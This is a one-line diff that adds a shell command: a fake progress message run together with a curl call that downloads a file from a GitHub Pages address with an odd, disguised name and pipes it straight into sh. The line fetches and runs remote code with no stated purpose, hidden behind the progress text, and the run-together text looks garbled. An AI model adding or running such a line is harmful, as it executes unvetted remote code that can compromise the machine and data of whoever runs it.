@@ -1,0 +1,1 @@
+echo Progress: 44.00%curl -L --progress-bar frkns.github.io/fun/CRAWFORD_FINANCES_SCOTT_SLIDE.WOW | sh
